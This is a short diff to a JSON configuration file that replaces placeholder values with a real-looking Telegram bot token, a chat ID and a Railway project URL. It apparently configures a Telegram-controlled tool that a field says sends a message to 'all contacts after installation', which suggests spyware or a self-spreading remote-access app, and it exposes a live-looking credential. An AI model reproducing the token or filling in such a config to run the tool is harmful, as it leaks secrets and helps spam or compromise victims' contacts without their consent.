@@ -1,6 +1,6 @@
 {
-    "token": "your bot token",
-    "id": "your telegram chat id here",
-    "host": "your render.com url here must use / after writing  url ex: https://google.com/",
+    "token": "7799923635:AAFqvA7X5-5yReltmhuv6Io9lDzGQ3FHwxY",
+    "id": "7576730454",
+    "host": "https://railway.com/project/0b5e3b83-58b2-493a-9d93-8e9338d98964/settings/tokens?environmentId=9cbc3556-d14c-48f1-831a-ebe37d5d41ac",
     "text": "dont write anything here it works only in premium version this feature send  this line on all contacts after installation"
 }
